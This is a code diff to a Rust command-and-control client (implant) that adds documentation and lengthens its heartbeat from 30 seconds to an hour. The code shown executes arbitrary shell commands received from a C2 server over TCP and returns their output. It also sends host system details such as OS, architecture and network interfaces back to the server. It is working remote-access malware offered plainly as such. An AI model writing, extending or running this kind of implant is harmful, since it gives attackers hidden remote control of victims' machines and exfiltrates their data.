@@ -3,6 +3,21 @@ use std::net::TcpStream;
 use std::process::Command;
 use crate::config::{Config, C2Command};
 
+/// Executes a given command on the client system.
+///
+/// This function spawns a shell process to execute the provided command and
+/// captures its output.
+/// If the command execution is successful, it returns the stdout as `Ok`.
+/// If the command fails, it returns the stderr as `Err`.
+///
+/// # Parameters
+///
+/// * `cmd`: A string slice that holds the command to be executed.
+///
+/// # Returns
+///
+/// A `Result` containing either the command output (stdout) as `Ok(String)`,
+/// or an error message (stderr) as `Err(String)` if the command execution fails.
 pub fn execute_command(cmd: &String) -> Result<String, String> {
     match Command::new("sh").arg("-c").arg(cmd).output() {
         Ok(output) => {
@@ -18,6 +33,16 @@ pub fn execute_command(cmd: &String) -> Result<String, String> {
     }
 }
 
+/// Sends system information to the server.
+///
+/// Serializes the client's system configuration into JSON format and sends it
+/// over the provided TCP stream.
+/// This information includes details such as the CPU architecture, operating
+/// system, and network interfaces.
+///
+/// # Parameters
+///
+/// * `stream`: A mutable reference to a TCPStream connected to the server.
 pub fn send_sys_info(stream: &mut TcpStream) {
     let config = Config::new();
     let config_json = config.to_json().expect("Failed to serialize Config") + "\n";
@@ -26,11 +51,21 @@ pub fn send_sys_info(stream: &mut TcpStream) {
     stream.flush().unwrap();
 }
 
+/// Listens for instructions from the server and executes them.
+///
+/// Continuously reads from the TCP stream for new commands, deserializes them,
+/// executes the command, and sends the output back to the server. This
+/// function maintains a loop to listen for instructions indefinitely until the
+/// connection is lost.
+///
+/// # Parameters
+///
+/// * `stream`: A mutable reference to a TCPStream connected to the server.
+///
+/// # Returns
+///
+/// An `io::Result<()>` indicating the success or failure of the operation.
 pub fn listening_for_instructions(stream: &mut TcpStream) -> io::Result<()> {
-    // read command
-    // deserialize command
-    // execute command
-    // send output to the C2 server
     let mut buffer: Vec<u8> = Vec::new();
 
     let mut reader = BufReader::new(stream.try_clone()?);
@@ -56,7 +91,8 @@ pub fn listening_for_instructions(stream: &mut TcpStream) -> io::Result<()> {
                                     name: command.name.clone(),
                                     output: Some(output),
                                 };
-                                let response_json = serde_json::to_string(&response).expect("Failed to serialize command response") + "\n";
+                                let response_json = serde_json::to_string(&response)
+                                    .expect("Failed to serialize command response") + "\n";
                                 println!("[I] Command {} output sent to C2", command.name);
                                 stream.write_all(response_json.as_bytes())?;
                                 stream.flush()?;
@@ -79,10 +115,16 @@ pub fn listening_for_instructions(stream: &mut TcpStream) -> io::Result<()> {
     }
 
     Ok(())
-    // Listen for new command/instruction from C2
-    // Call function received_instruction - executes the instruction + sends the output to C2
 }
 
+/// Sends a heartbeat message to the server in a loop.
+///
+/// Every  hour (3600 seconds), it sends a predefined heartbeat message to the server to indicate
+/// that the client is still connected and operational. If sending the heartbeat fails, the loop breaks.
+///
+/// # Parameters
+///
+/// * `stream`: A mutable reference to a TCPStream connected to the server.
 pub fn send_heartbeat_loop(stream: &mut TcpStream) {
     loop {
         let heartbeat_message = "heartbeat\n"; // Define your heartbeat message
@@ -90,7 +132,7 @@ pub fn send_heartbeat_loop(stream: &mut TcpStream) {
             println!("[E] Failed to send heartbeat: {}", e);
             break;
         }
-        std::thread::sleep(std::time::Duration::from_secs(30));
+        std::thread::sleep(std::time::Duration::from_secs(3600));
     }
 }
 
